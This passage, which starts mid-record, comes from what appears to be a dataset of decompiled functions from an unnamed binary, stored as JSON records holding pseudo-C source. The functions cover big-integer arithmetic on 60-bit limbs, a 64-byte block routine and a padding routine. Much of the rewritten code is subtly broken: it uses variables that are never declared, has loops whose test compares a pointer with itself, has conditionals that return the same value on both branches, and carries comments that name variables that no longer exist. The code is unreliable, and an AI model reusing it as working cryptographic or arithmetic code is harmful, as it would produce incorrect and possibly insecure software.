0x18);\nlocal_f0[0x24] = (byte)uVar26;\nlocal_f0[0x25] = (byte)(uVar26 >> 8);\nlocal_f0[0x27] = (byte)(uVar26 >> 0x18);\nlocal_f0[0x28] = (byte)local_108;\nlocal_f0[0x26] = (byte)(uVar26 >> 0x10);\nlocal_f0[0x29] = (byte)(local_108 >> 8);\nlocal_f0[0x2a] = (byte)(local_108 >> 0x10);\nlocal_f0[0x2c] = (byte)uVar30;\nlocal_f0[0x30] = (byte)uVar23;\nlocal_f0[0x2b] = (byte)(local_108 >> 0x18);\nlocal_f0[0x34] = (byte)uVar21;\nlocal_f0[0x38] = (byte)uVar17;\nlocal_f0[0x2d] = (byte)(uVar30 >> 8);\nlocal_f0[0x2f] = (byte)(uVar30 >> 0x18);\nlocal_f0[0x2e] = (byte)(uVar30 >> 0x10);\nlocal_f0[0x31] = (byte)(uVar23 >> 8);\nlocal_f0[0x33] = (byte)(uVar23 >> 0x18);\nlocal_f0[0x32] = (byte)(uVar23 >> 0x10);\nlocal_f0[0x35] = (byte)(uVar21 >> 8);\nlocal_f0[0x37] = (byte)(uVar21 >> 0x18);\nlocal_f0[0x36] = (byte)(uVar21 >> 0x10);\nlocal_f0[0x39] = (byte)(uVar17 >> 8);\nlocal_f0[0x3a] = (byte)(uVar17 >> 0x10);\nlocal_f0[0x3b] = (byte)(uVar17 >> 0x18);\nlocal_f0[0x3c] = (byte)uVar27;\nlocal_f0[0x3d] = (byte)(uVar27 >> 8);\nlocal_f0[0x3e] = (byte)(uVar27 >> 0x10);\nlocal_f0[0x3f] = (byte)(uVar27 >> 0x18);\nif (local_f8 < 0x41) break;\nparam_2 = param_2 + 0x40;\nlocal_f8 = local_f8 - 0x40;\npbVar15 = local_d8;\nlocal_d8 = local_f0 + 0x40;\n}\nlVar16 = 0;\nif ((local_f8 & 0xffffffbf) != 0) {\ndo {\nlocal_d8[lVar16] = local_f0[lVar16];\nlVar16 = lVar16 + 1;\n} while ((uint)lVar16 < local_f8);\n}\nparam_1[0xc] = local_f4;\nparam_1[0xd] = local_e8;\n*(char *)(param_1 + 0x20) = '@' - (char)local_f8;\nreturn;\n}\nLocal Variable: local_39 : undefined1\nLocal Variable: local_3a : undefined1\nLocal Variable: local_3b : undefined1\nLocal Variable: local_3c : undefined1\nLocal Variable: local_3d : undefined1\nLocal Variable: local_3e : undefined1\nLocal Variable: local_3f : undefined1\nLocal Variable: local_40 : undefined1\nLocal Variable: local_41 : undefined1\nLocal Variable: local_42 : undefined1\nLocal Variable: local_43 : undefined1\nLocal Variable: local_44 : undefined1\nLocal Variable: local_45 : undefined1\nLocal Variable: local_46 : undefined1\nLocal Variable: local_47 : undefined1\nLocal Variable: local_48 : undefined1\nLocal Variable: local_49 : undefined1\nLocal Variable: local_4a : undefined1\nLocal Variable: local_4b : undefined1\nLocal Variable: local_4c : undefined1\nLocal Variable: local_4d : undefined1\nLocal Variable: local_4e : undefined1\nLocal Variable: local_4f : undefined1\nLocal Variable: local_50 : undefined1\nLocal Variable: local_51 : undefined1\nLocal Variable: local_52 : undefined1\nLocal Variable: local_53 : undefined1\nLocal Variable: local_54 : undefined1\nLocal Variable: local_55 : undefined1\nLocal Variable: local_56 : undefined1\nLocal Variable: local_57 : undefined1\nLocal Variable: local_58 : undefined1\nLocal Variable: local_59 : undefined1\nLocal Variable: local_5a : undefined1\nLocal Variable: local_5b : undefined1\nLocal Variable: local_5c : undefined1\nLocal Variable: local_5d : undefined1\nLocal Variable: local_5e : undefined1\nLocal Variable: local_5f : undefined1\nLocal Variable: local_60 : undefined1\nLocal Variable: local_61 : undefined1\nLocal Variable: local_62 : undefined1\nLocal Variable: local_63 : undefined1\nLocal Variable: local_64 : undefined1\nLocal Variable: local_65 : undefined1\nLocal Variable: local_66 : undefined1\nLocal Variable: local_67 : undefined1\nLocal Variable: local_68 : undefined1\nLocal Variable: local_69 : undefined1\nLocal Variable: local_6a : undefined1\nLocal Variable: local_6b : undefined1\nLocal Variable: local_6c : undefined1\nLocal Variable: local_6d : undefined1\nLocal Variable: local_6e : undefined1\nLocal Variable: local_6f : undefined1\nLocal Variable: local_70 : undefined1\nLocal Variable: local_71 : undefined1\nLocal Variable: local_72 : undefined1\nLocal Variable: local_73 : undefined1\nLocal Variable: local_74 : undefined1\nLocal Variable: local_75 : undefined1\nLocal Variable: local_76 : undefined1\nLocal Variable: local_77 : undefined1\nLocal Variable: local_78 : undefined1\nLocal Variable: local_80 : undefined8\nLocal Variable: local_84 : undefined4\nLocal Variable: local_88 : undefined4\nLocal Variable: local_8c : undefined4\nLocal Variable: local_90 : undefined4\nLocal Variable: local_94 : undefined4\nLocal Variable: local_98 : undefined4\nLocal Variable: local_9c : undefined4\nLocal Variable: local_a0 : undefined4\nLocal Variable: local_a4 : undefined4\nLocal Variable: local_a8 : undefined4\nLocal Variable: local_ac : undefined4\nLocal Variable: local_b0 : undefined4\nLocal Variable: local_b4 : undefined4\nLocal Variable: local_b8 : undefined4\nLocal Variable: local_bc : undefined4\nLocal Variable: local_c0 : undefined4\nLocal Variable: local_c4 : undefined4\nLocal Variable: local_c8 : undefined4\nLocal Variable: local_cc : undefined4\nLocal Variable: local_d0 : undefined4\nLocal Variable: local_d8 : undefined8\nLocal Variable: local_dc : undefined4\nLocal Variable: local_e0 : undefined4\nLocal Variable: local_e4 : undefined4\nLocal Variable: local_e8 : undefined4\nLocal Variable: local_f0 : undefined8\nLocal Variable: local_f4 : undefined4\nLocal Variable: local_f8 : undefined4\nLocal Variable: local_100 : undefined8\nLocal Variable: local_104 : undefined4\nLocal Variable: local_108 : undefined4\nLocal Variable: local_10c : undefined4"}
{"Function Name": "FUN_00405aa0", "Address": "00405aa0", "Source Code": "undefined8\nFUN_00405aa0(void *input_data, size_t input_size, int operation_type, ulong data_length, undefined8 context, int function_index,\nundefined *buffer, ulong *buffer_size)\n{\n    \n    size_t adjusted_size = (ulong)((data_length & 7) != 0) + (data_length >> 3) - input_size - 3;\n    \n    ulong total_size = (ulong)((data_length & 7) != 0) + (data_length >> 3);\n    \n    \n    if (total_size < input_size + 0xb) {\n        return 0x16; \n    }\n    \n    \n    if (*buffer_size < total_size) {\n        *buffer_size = total_size;\n        return 6;\n    }\n    \n    \n    char *data_pointer = buffer + 2;\n    \n    \n    if (operation_type == 2) {\n        \n        size_t result_size = (*(code *)(&DAT_006495e8)[(long)function_index * 10])(data_pointer, adjusted_size, context);\n        \n        \n        if (adjusted_size == result_size) {\n            \n            if (adjusted_size == 0) goto LAB_00405b15;\n            do {\n                \n                while (*data_pointer != '\\0') {\n                    data_pointer++;\n                    \n                    if (data_pointer == buffer + total_size - 1) goto LAB_00405b15;\n                }\n            } while ((*(code *)(&DAT_006495e8)[(long)function_index * 10])(data_pointer, 1, context) == 1);\n        }\n        return 9; \n    }\n    \n    \n    memset(data_pointer, 0xff, adjusted_size);\nLAB_00405b15:\n    \n    buffer[1] = (char)operation_type;\n    \n    *buffer = 0;\n    \n    buffer[total_size - 1] = 0;\n    \n    memcpy(buffer + total_size, input_data, input_size);\n    \n    *buffer_size = total_size;\n    return 0; \n}"}
{"Function Name": "FUN_00405cb0", "Address": "00405cb0", "Source Code": "undefined8 FUN_00405cb0(int *param_1, int *param_2, int *param_3, int param_4)\n{\n    undefined8 returnValue; \n    long dataFromParam1; \n    long dataFromParam2; \n    undefined intermediateResult1[16]; \n    undefined intermediateResult2[16]; \n    undefined accumulatedResult[16]; \n    int loopIndex; \n    int loopCounter; \n    long indexOffset; \n    ulong computedValues[513]; \n    ulong *nextElementPointer; \n    ulong *param2Pointer; \n    ulong *param1Pointer; \n    long unusedVariable; \n    int sumOfParams = *param_1 + *param_2; \n    \n    if ((param_3[1] < param_4) && (returnValue = FUN_00405a20(), (int)returnValue != 0)) {\n        return returnValue; \n    }\n    \n    \n    if (sumOfParams < param_4) {\n        param_4 = sumOfParams; \n    }\n    \n    \n    if (param_4 < 1) {\n        *param_3 = param_4; \n        nextElementPointer = *(undefined8 **)(param_3 + 4); \n        return (param_4 != 0) ? 0 : 0; \n    }\n    dataFromParam1 = *(long *)(param_1 + 4); \n    dataFromParam2 = *(long *)(param_2 + 4); \n    accumulatedResult = ZEXT816(0); \n    \n    \n    for (loopCounter = 0; loopCounter < param_4; loopCounter++) {\n        indexOffset = (long)loopCounter * 8; \n        loopIndex = (loopCounter < *param_2) ? loopCounter : *param_2 - 1; \n        param2Pointer = (ulong *)(dataFromParam2 + (long)loopIndex * 8); \n        param1Pointer = (ulong *)(indexOffset + dataFromParam1); \n        \n        \n        if (loopCounter < loopIndex + 1) {\n            intermediateResult1._0_8_ = *param2Pointer; \n            intermediateResult2._0_8_ = *param1Pointer; \n            accumulatedResult = intermediateResult1 * intermediateResult2 + accumulatedResult; \n        }\n        \n        \n        *(ulong *)((long)computedValues + indexOffset + (long)*param_2 * 8 - 8) = accumulatedResult._0_8_ & 0xfffffffffffffff; \n        accumulatedResult = accumulatedResult >> 0x3c; \n    }\n    *param_3 = param_4; \n    nextElementPointer = *(undefined8 **)(param_3 + 4); \n    \n    \n    for (indexOffset = 0; indexOffset <= param_4; indexOffset++) {\n        nextElementPointer[indexOffset] = computedValues[indexOffset]; \n    }\n    \n    if (param_4 > 0) {\n        if (nextElementPointer[param_4 - 1] != 0) {\n            return 0; \n        }\n        \n        \n        while (--param_4 != 0) {\n            if (nextElementPointer[param_4 - 1] != 0) {\n                *param_3 = param_4; \n                return 0; \n            }\n        }\n        *param_3 = 0; \n    }\n    \n    param_3[2] = 0; \n    return 0; \n}"}
{"Function Name": "FUN_00405ef0", "Address": "00405ef0", "Source Code": "undefined8 FUN_00405ef0(int *input_array_1, int *input_array_2, uint *output_array, uint size)\n{\n    undefined temp_var_1[16]; \n    undefined temp_var_2[16]; \n    undefined accumulator[16]; \n    int temp_calc_1;            \n    int temp_calc_2;            \n    uint index;           \n    undefined8 return_value;     \n    long temp_calc_3;           \n    ulong *memory_pointer_1;        \n    long temp_calc_4;          \n    uint sum_values;          \n    int value_from_input_2;           \n    ulong temp_calc_5;         \n    long temp_calc_6;          \n    ulong *memory_pointer_2;       \n    uint loop_counter;          \n    long offset;          \n    int value_from_input_1;           \n    ulong result_stack[513]; \n    value_from_input_1 = *input_array_1; \n    value_from_input_2 = *input_array_2; \n    sum_values = value_from_input_1 + value_from_input_2; \n    \n    if ((int)output_array[1] < (int)sum_values) {\n        return_value = FUN_00405a20(output_array); \n        if ((int)return_value != 0) {\n            return return_value; \n        }\n    }\n    \n    if ((int)size < (int)sum_values) {\n        temp_calc_6 = *(long *)(input_array_1 + 4); \n        temp_calc_4 = *(long *)(input_array_2 + 4); \n        accumulator = ZEXT816(0); \n        offset = ((long)(1 - value_from_input_2) + (long)(int)size) * 8; \n        loop_counter = size; \n        do {\n            \n            if ((int)loop_counter < value_from_input_2) {\n                temp_calc_3 = 0; \n                temp_calc_1 = 0; \n                index = loop_counter; \n            } else {\n                temp_calc_1 = (1 - value_from_input_2) + loop_counter; \n                temp_calc_3 = offset; \n                index = value_from_input_2 - 1; \n            }\n            memory_pointer_1 = (ulong *)(temp_calc_4 + (long)(int)index * 8); \n            temp_calc_2 = value_from_input_1 - temp_calc_1; \n            if ((int)index < value_from_input_1 - temp_calc_1) {\n                temp_calc_2 = index + 1; \n            }\n            \n            if (0 < temp_calc_2) {\n                memory_pointer_2 = (ulong *)(temp_calc_3 + temp_calc_6); \n                do {\n                    temp_var_1._0_8_ = *memory_pointer_1; \n                    temp_var_2._0_8_ = *memory_pointer_2; \n                    accumulator = temp_var_1 * temp_var_2 + accumulator; \n                    memory_pointer_1--; \n                    memory_pointer_2++; \n                } while (memory_pointer_1 != (ulong *)(temp_calc_4 + (long)(int)(index - temp_calc_2 + 1) * 8)); \n            }\n            temp_calc_5 = accumulator._0_8_; \n            result_stack[temp_calc_3] = temp_calc_5 & 0xfffffffffffffff; \n            loop_counter++; \n            offset += 8; \n            accumulator = accumulator >> 0x3c; \n        } while (loop_counter != sum_values); \n        memory_pointer_1 = (ulong *)(*(long *)(output_array + 4) + (long)(int)size * 8); \n        index = size; \n        \n        do {\n            *memory_pointer_1 = result_stack[index]; \n            memory_pointer_1++; \n            index++; \n        } while (index != sum_values); \n    } else {\n        memory_pointer_1 = (ulong *)(*(long *)(output_array + 4) + (long)(int)size * 8); \n    }\n    \n    if ((int)sum_values < (int)*output_array) {\n        ulong *puVar11 = memory_pointer_1 + (ulong)((*output_array - 1) - sum_values) + 1; \n        do {\n            *memory_pointer_1 = 0; \n            memory_pointer_1++; \n        } while (memory_pointer_1 != puVar11); \n    }\n    \n    if ((int)sum_values < 1) {\n        if (sum_values != 0) {\n            return 0; \n        }\n    } else {\n        long *plVar10 = (long *)(*(long *)(output_array + 4) - 0x10 + (long)(int)sum_values * 8); \n        \n        if (*(long *)(*(long *)(output_array + 4) - 8 + (long)(int)sum_values * 8) != 0) {\n            return 0; \n        }\n        while (sum_values-- != 0) { \n            temp_calc_6 = *plVar10--; \n            if (temp_calc_6 != 0) { \n                *output_array = sum_values; \n                return 0; \n            }\n        }\n        *output_array = 0; \n    }\n    output_array[2] = 0; \n    return 0; \n}"}
{"Function Name": "FUN_00406130", "Address": "00406130", "Source Code": "\nundefined8 FUN_00406130(int *param_1,uint *param_2)\n{\n    undefined8 returnValue; // Variable to hold return value\n    ulong *ulongPointer; // Pointer to ulong\n    int valueFromParam1; // Variable to hold the value pointed by param_1\n    uint doubledValue; // Variable to hold doubled value of iVar27\n    uint originalValueParam2; // Variable to hold the original value of param_2\n    long loopIndex; // Variable for loop index or offset\n    ulong intermediateCalculation; // Variable for intermediate calculations\n    ulong *calculationPointer1; // Pointer for calculations\n    ulong *calculationPointer2; // Pointer for calculations\n    ulong *calculationPointer3; // Pointer for calculations\n    int loopCounter1; // Loop counter\n    int loopCounter2; // Loop counter\n    int calculationVariable; // Variable for calculations\n    uint loopCounter3; // Loop counter\n    uint calculationVariable2; // Variable for calculations\n    long calculationVariable3; // Variable for calculations\n    undefined intermediateArray1[16]; // Array for intermediate calculations\n    undefined intermediateArray2[16]; // Array for intermediate calculations\n    undefined intermediateArray3[16]; // Array for intermediate calculations\n    ulong resultStackArray[513]; // Stack array for results\n    undefined8 *resultPointer1; // Pointer for results\n    undefined8 *resultPointer2; // Pointer for results\n\n    valueFromParam1 = *param_1; // Get the value from param_1\n    doubledValue = valueFromParam1 * 2; // Double the value of iVar27\n    if ((int)param_2[1] < (int)doubledValue) { // Check if the second element of param_2 is less than uVar18\n        returnValue = FUN_00405a20(param_2); // Call another function with param_2\n        if ((int)returnValue != 0) { // Check if the return value is not zero\n            return returnValue; // Return the value\n        }\n    }\n    if ((int)doubledValue < 1) { // Check if uVar18 is less than 1\n        doubledValue = 0; // Set uVar18 to 0\n        originalValueParam2 = *param_2; // Get the original value of param_2\n        *param_2 = doubledValue; // Update param_2 with uVar18\n        resultPointer1 = *(undefined8 **)(param_2 + 4); // Get pointer from param_2\n        resultPointer2 = resultPointer1; // Assign to another pointer\n    } else {\n        originalValueParam2 = valueFromParam1 - 1; // Calculate uVar19\n        ulongPointer = *(ulong **)(param_1 + 4); // Get pointer from param_1\n        loopCounter1 = valueFromParam1 * 2; // Double the value of iVar27\n        loopIndex = 0; // Initialize loop index\n        loopCounter3 = 0; // Initialize loop counter\n        intermediateArray3 = ZEXT816(0); // Initialize array for calculations\n        do {\n            loopCounter1 = loopCounter1 - 1; // Decrement iVar9\n            if ((int)loopCounter3 < valueFromParam1) { // Check if uVar14 is less than iVar27\n                calculationPointer2 = (ulong *)((long)ulongPointer + loopIndex); // Calculate pointer\n                calculationVariable = 0; // Initialize variable\n                calculationPointer3 = ulongPointer; // Assign pointer\n                calculationVariable2 = loopCounter3; // Assign value\n                LAB_00406375: // Label for loop\n                loopCounter2 = calculationVariable2 + 1; // Increment uVar16\n            } else {\n                calculationVariable = (1 - valueFromParam1) + loopCounter3; // Calculate iVar17\n                calculationPointer3 = (ulong *)((long)ulongPointer + loopIndex + (long)(int)-originalValueParam2 * 8); // Calculate pointer\n                calculationPointer2 = ulongPointer + (int)originalValueParam2; // Assign pointer\n                calculationVariable2 = originalValueParam2; // Assign value\n                loopCounter2 = loopCounter1; // Assign value\n                if ((int)originalValueParam2 < loopCounter1) goto LAB_00406375; // Check condition and jump\n            }\n            calculationVariable = (int)((calculationVariable2 - calculationVariable) + 1) >> 1; // Calculate iVar17\n            if (calculationVariable <= loopCounter2) { // Check if iVar17 is less than or equal to iVar10\n                loopCounter2 = calculationVariable; // Update iVar10\n            }\n            if (loopCounter2 < 1) { // Check if iVar10 is less than 1\n                calculationVariable3 = 0; // Initialize lVar21\n                intermediateCalculation = 0; // Initialize uVar22\n            } else {\n                intermediateArray2 = ZEXT816(0); // Initialize array for calculations\n                calculationPointer1 = calculationPointer2; // Assign pointer\n                do {\n                    calculationPointer1 = calculationPointer1 - 1; // Decrement pointer\n                    intermediateArray1._8_8_ = 0; // Initialize array\n                    intermediateArray1._0_8_ = *calculationPointer1; // Get value from pointer\n                    intermediateArray2 = intermediateArray1 * intermediateArray2; // Multiply arrays\n                } while (calculationPointer1 != calculationPointer2 + (-1 - (ulong)(loopCounter2 - 1))); // Loop condition\n                intermediateCalculation = intermediateArray2._8_8_ << 1 | intermediateArray2._0_8_ >> 0x3f; // Calculate uVar22\n                calculationVariable3 = intermediateArray2._0_8_ * 2; // Calculate lVar21\n            }\n            intermediateArray2._8_8_ = intermediateCalculation; // Assign value to array\n            intermediateArray2._0_8_ = calculationVariable3; // Assign value to array\n            intermediateArray3 = intermediateArray3 + intermediateArray2; // Add arrays\n            if ((loopCounter3 & 1) == 0) { // Check if uVar14 is even\n                intermediateArray1._8_8_ = 0; // Initialize array\n                intermediateArray1._0_8_ = ulongPointer[(int)loopCounter3 >> 1]; // Get value from pointer\n                intermediateArray3 = intermediateArray1 * intermediateArray1 + intermediateArray3; // Multiply and add arrays\n            }\n            loopCounter3 = loopCounter3 + 1; // Increment uVar14\n            *(ulong *)((long)resultStackArray + loopIndex) = intermediateArray3._0_8_ & 0xfffffffffffffff; // Store result\n            loopIndex = loopIndex + 8; // Increment index\n            intermediateArray3 = intermediateArray3 >> 0x3c; // Shift array\n        } while (loopCounter3 != doubledValue); // Loop until uVar14 equals uVar18\n        originalValueParam2 = *param_2; // Get original value of param_2\n        resultPointer2 = *(undefined8 **)(param_2 + 4); // Get pointer from param_2\n        *param_2 = doubledValue; // Update param_2 with uVar18\n        loopIndex = 0; // Initialize loop index\n        do {\n            *(ulong *)((long)resultPointer2 + loopIndex) = *(ulong *)((long)resultStackArray + loopIndex) & 0xfffffffffffffff; // Store results\n            loopIndex = loopIndex + 8; // Increment index\n        } while (loopIndex != (ulong)(doubledValue - 1) * 8 + 8); // Loop until condition met\n        resultPointer1 = (undefined8 *)(loopIndex + (long)resultPointer2); // Update pointer\n    }\n    if ((int)doubledValue < (int)originalValueParam2) { // Check if uVar18 is less than uVar19\n        resultPointer1 += (ulong)((originalValueParam2 - 1) - doubledValue) + 1; // Adjust pointer\n        do {\n            *resultPointer1 = 0; // Set value to 0\n            resultPointer1 = resultPointer1 + 1; // Increment pointer\n        } while (resultPointer1 != resultPointer1); // Loop condition\n    }\n    if ((int)doubledValue < 1) { // Check if uVar18 is less than 1\n        if (doubledValue != 0) { // Check if uVar18 is not zero\n            return 0; // Return 0\n        }\n    } else {\n        long *plVar13 = resultPointer2 + (long)(int)doubledValue - 2; // Calculate pointer\n        if (resultPointer2[(long)(int)doubledValue - 1] != 0) { // Check if last element is not zero\n            return 0; // Return 0\n        }\n        while (doubledValue-- != 0) { // Loop until uVar18 is zero\n            loopIndex = *plVar13; // Get value from pointer\n            plVar13 = plVar13 - 1; // Decrement pointer\n            if (loopIndex != 0) { // Check if value is not zero\n                *param_2 = doubledValue; // Update param_2 with uVar18\n                return 0; // Return 0\n            }\n        }\n        *param_2 = 0; // Set param_2 to 0\n    }\n    param_2[2] = 0; // Set the third element of param_2 to 0\n    return 0; // Return 0\n}\n"}
{"Function Name": "FUN_004063d0", "Address": "004063d0", "Source Code": "undefined8 FUN_004063d0(int *array, int inputValue)\n{\n    long index; \n    long addressOffset; \n    int secondElement = array[1]; \n    array[2] = 0; \n    *array = 0; \n    addressOffset = *(long *)(array + 4); \n    index = 0; \n    if (0 < secondElement) { \n        do {\n            *(undefined8 *)(addressOffset + index * 8) = 0; \n            index++; \n        } while (index < secondElement); \n    }\n    int calculatedValue = inputValue / 0x3c + 1; \n    if (secondElement < calculatedValue) { \n        undefined8 functionResult = FUN_00405a20(array, calculatedValue); \n        if ((int)functionResult != 0) { \n            return functionResult; \n        }\n        addressOffset = *(long *)(array + 4); \n    }\n    *array = calculatedValue; \n    *(long *)(addressOffset + (long)(inputValue / 0x3c) * 8) = \n        1L << ((char)inputValue + (char)(inputValue / 0x3c) * -0x3c & 0x3fU);\n    return 0; \n}"}
{"Function Name": "FUN_00406680", "Address": "00406680", "Source Code": "ulong FUN_00406680(long input_address_1, long input_address_2)\n{\n    \n    int retrieved_value = *(int *)(input_address_1 + 8);\n    \n    \n    if (retrieved_value != *(int *)(input_address_2 + 8)) {\n        \n        return (ulong)(((retrieved_value != 1) - 1) + (uint)(retrieved_value != 1));\n    }\n    \n    \n    \n    \n    return (retrieved_value != 1) ? FUN_004065f0() : FUN_004065f0(input_address_2, input_address_1);\n}"}
{"Function Name": "FUN_00406750", "Address": "00406750", "Source Code": "undefined8 FUN_00406750(int *param_1, int *param_2)\n{\n    long longValueFromParam1; \n    long loopCounter; \n    undefined8 *destinationArrayPointer; \n    undefined8 returnValueFromFun; \n    int firstIntegerFromParam1; \n    int numberOfElementsCopied; \n    \n    if (param_1 == param_2) {\n        return 0; \n    }\n    \n    firstIntegerFromParam1 = *param_1; \n    \n    if (param_2[1] < firstIntegerFromParam1) {\n        returnValueFromFun = FUN_00405a20(param_2); \n        if ((int)returnValueFromFun != 0) {\n            return returnValueFromFun; \n        }\n    }\n    longValueFromParam1 = *(long *)(param_1 + 4); \n    destinationArrayPointer = *(undefined8 **)(param_2 + 4); \n    \n    if (firstIntegerFromParam1 < 1) {\n        numberOfElementsCopied = 0; \n    } else {\n        loopCounter = 0; \n        do {\n            destinationArrayPointer[loopCounter] = *(undefined8 *)(longValueFromParam1 + loopCounter * 8); \n            loopCounter = loopCounter + 1; \n        } while ((int)loopCounter < firstIntegerFromParam1); \n        destinationArrayPointer += firstIntegerFromParam1; \n        numberOfElementsCopied = firstIntegerFromParam1; \n    }\n    \n    if (numberOfElementsCopied < *param_2) {\n        destinationArrayPointer += (*param_2 - numberOfElementsCopied); \n        do {\n            *destinationArrayPointer = 0; \n            destinationArrayPointer++; \n        } while (destinationArrayPointer != destinationArrayPointer + (*param_2 - numberOfElementsCopied)); \n    }\n    param_2[0] = firstIntegerFromParam1; \n    param_2[2] = param_1[2]; \n    return 0; \n}"}
{"Function Name": "FUN_00406800", "Address": "00406800", "Source Code": "undefined8 FUN_00406800(long input_value_1, long input_value_2)\n{\n    \n    if ((input_value_1 != input_value_2) && ((int)check_condition() != 0)) {\n        \n        return check_condition();\n    }\n    \n    *(undefined4 *)(input_value_2 + 8) = 0;\n    \n    return 0;\n}"}
{"Function Name": "FUN_00406c70", "Address": "00406c70", "Source Code": "void FUN_00406c70(uint *inputArray, ulong inputValue)\n{\n    uint secondElement; \n    ulong *ulongArrayPointer; \n    long loopCounter = 0; \n    \n    if (FUN_00406af0() == 0) {\n        secondElement = inputArray[1]; \n        inputArray[2] = 0; \n        *inputArray = 0; \n        ulongArrayPointer = *(ulong **)(inputArray + 4); \n        \n        if (secondElement > 0) {\n            \n            do {\n                ulongArrayPointer[loopCounter] = 0; \n                loopCounter++; \n            } while (loopCounter < (long)secondElement); \n        }\n        \n        *ulongArrayPointer = inputValue & 0xfffffffffffffff; \n        \n        *inputArray = (uint)((inputValue & 0xfffffffffffffff) != 0);\n    }\n}"}
{"Function Name": "FUN_00406d50", "Address": "00406d50", "Source Code": "int FUN_00406d50(uint *inputArray, undefined8 *outputArray, ulong *outputValue)\n{\n    ulong tempValue1, tempValue5, tempValue6, tempValue11, tempValue13; \n    long tempLong2, tempLong9, tempLong10; \n    undefined8 tempOutput3, localValue58, localValue50; \n    ulong localValue78; \n    uint localValue5C, tempValue12, tempValue14; \n    \n    if (FUN_00406ce0(&localValue58, *inputArray) != 0) {\n        return returnValue; \n    }\n    \n    tempValue14 = *inputArray; \n    localValue5C = inputArray[2]; \n    localValue58 = CONCAT44(localValue58._4_4_, tempValue14); \n    tempValue12 = tempValue14 - 1; \n    localValue50 = CONCAT44(localValue50._4_4_, localValue5C); \n    \n    \n    if ((int)tempValue12 >= 0) {\n        tempLong9 = 0; \n        localValue78 = 0; \n        do {\n            tempValue5 = localValue78 >> 4; \n            \n            localValue78 = localValue78 << 0x3c | *(ulong *)((long)(int)tempValue12 * 8 + *(long *)(inputArray + 4) + tempLong9);\n            \n            if ((tempValue5 != 0) || (tempValue11 = 0, 2 < localValue78)) {\n                \n                tempValue13 = SUB168(CONCAT88(0, localValue78) * ZEXT816(0x555555555555555), 8) + tempValue5 * 0x555555555555555;\n                tempValue6 = tempValue13 * 0x10; \n                tempValue11 = SUB168(CONCAT88(0, localValue78) * ZEXT816(0x555555555555555), 0) >> 0x3c | tempValue6; \n                tempValue13 = tempValue13 >> 0x3c; \n                tempValue1 = localValue78 + tempValue11 * -2; \n                \n                tempLong10 = (((tempValue5 - (tempValue13 << 1 | tempValue6 >> 0x3f)) - (ulong)(localValue78 < tempValue11 * 2)) - tempValue13) - (ulong)(tempValue1 < tempValue11);\n                for (localValue78 = tempValue1 - tempValue11; (tempLong10 != 0 || (2 < localValue78)); localValue78 -= 3) {\n                    tempValue11++; \n                    tempLong10++; \n                }\n            }\n            \n            *(ulong *)((long)(int)tempValue12 * 8 + localMemoryLocation + tempLong9) = tempValue11;\n            tempLong9 -= 8; \n        } while (tempLong9 != ~(ulong)tempValue12 * 8); \n    }\n    \n    if (outputValue != (ulong *)0x0) {\n        *outputValue = localValue78; \n    }\n    \n    \n    if (outputArray != (undefined8 *)0x0) {\n        \n        if ((int)tempValue14 < 1) {\n            if (tempValue14 == 0) {\n                goto LAB_00406f07; \n            }\n        } else if (*(long *)(localMemoryLocation + -8 + (long)(int)tempValue14 * 8) == 0) {\n            long *pointerToMemory = (long *)(localMemoryLocation + -0x10 + (long)(int)tempValue14 * 8); \n            for (tempValue14 = tempValue12; tempValue14 != 0; tempValue14--) {\n                if (*pointerToMemory != 0) {\n                    goto LAB_00406f12; \n                }\n                pointerToMemory--; \n            }\n            LAB_00406f07:\n            localValue5C = 0; \n            tempValue14 = 0; \n        }\n    }\n    \n    LAB_00406f12:\n    tempOutput3 = *outputArray; \n    *(uint *)outputArray = tempValue14; \n    *(int *)((long)outputArray + 4) = localValue58._4_4_; \n    outputArray[2] = localMemoryLocation; \n    localValue58 = tempOutput3; \n    LAB_00406f4a:\n    FUN_004064f0(&localValue58); \n    return 0; \n}"}
{"Function Name": "FUN_00406fc0", "Address": "00406fc0", "Source Code": "undefined8 FUN_00406fc0(int *param_1, int *param_2, undefined8 *param_3)\n{\n    long longValueFromParam1Plus4; \n    long iterationIndex; \n    int valueCount;  \n    int countOrSize; \n    undefined4 initializedValue = 0; \n    undefined8 functionReturnValue; \n    \n    if (*param_2 < *param_1) {\n        \n        functionReturnValue = FUN_00406f80(&countOrSize, param_1);\n        \n        if ((int)functionReturnValue != 0) {\n            return functionReturnValue;\n        }\n        valueCount = *param_2; \n        param_1 = param_2; \n    } else {\n        \n        functionReturnValue = FUN_00406f80(&countOrSize);\n        \n        if ((int)functionReturnValue != 0) {\n            return functionReturnValue;\n        }\n        valueCount = *param_1; \n    }\n    \n    if (valueCount < 1) {\n        valueCount = 0; \n    } else {\n        longValueFromParam1Plus4 = *(long *)(param_1 + 4); \n        iterationIndex = 0; \n        \n        do {\n            *(ulong *)(local_38 + iterationIndex * 8) &= *(ulong *)(longValueFromParam1Plus4 + iterationIndex * 8); \n            iterationIndex++; \n        } while (iterationIndex < valueCount); \n    }\n    \n    if (valueCount < countOrSize) {\n        undefined8 *currentPointer = (undefined8 *)(local_38 + (long)valueCount * 8); \n        \n        do {\n            *currentPointer++ = 0; \n        } while (currentPointer != (undefined8 *)(local_38 + 8 + ((long)valueCount + (ulong)(uint)((countOrSize + -1) - valueCount)) * 8)); \n    }\n    \n    if (countOrSize > 0) {\n        longValueFromParam1Plus4 = *(long *)(local_38 + -8 + (long)countOrSize * 8); \n        long *previousValuePointer = (long *)(local_38 + -0x10 + (long)countOrSize * 8); \n        \n        while (longValueFromParam1Plus4 == 0) {\n            countOrSize--; \n            if (countOrSize == 0) { \n                goto LAB_0040707b; \n            }\n            longValueFromParam1Plus4 = *previousValuePointer--; \n        }\n    }\nLAB_0040707b:\n    *param_3 = CONCAT44(countOrSize, initializedValue); \n    initializedValue = *(undefined4 *)((long)param_3 + 4); \n    param_3[1] = CONCAT44(uStack_3c, initializedValue); \n    param_3[2] = local_38; \n    FUN_004064f0(&countOrSize); \n    return 0; \n}"}
